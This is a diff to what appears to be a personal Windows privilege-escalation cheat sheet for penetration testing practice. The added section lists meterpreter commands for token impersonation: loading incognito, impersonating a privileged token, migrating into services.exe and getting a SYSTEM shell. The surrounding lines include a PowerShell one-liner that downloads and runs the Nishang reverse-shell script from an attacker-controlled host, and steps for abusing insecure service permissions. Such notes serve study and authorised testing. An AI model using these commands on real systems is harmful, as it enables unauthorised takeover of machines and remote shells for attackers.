@@ -520,6 +520,18 @@ Output file contents:
 - powershell reverse shell: https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
 - download and run with: `powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port`
 
+### Privesc with token impersonation
+- from a meterpreter shell
+- cmd: `whoami /priv`
+- meterpreter: `load incognito`
+- meterpreter: `list_tokens -g`
+- meterpreter: `impersonate_token "[token_name]"`
+- meterpreter: `getuid` to see it it worked
+- now you have a impersonation token with higher privileges, but not a full shell
+- list processes (meterpreter): `ps`
+- migrate to process (like services.exe): `migrate [PID]`
+- go to shell to get shell as SYSTEM: `shell`
+
 ### Insecure Service Permissions
 - Use accesschk.exe to check the "user" account's permissions on the "daclsvc" service:`C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc`
 - query the serivce: `sc qc daclsvc` (runs as system)
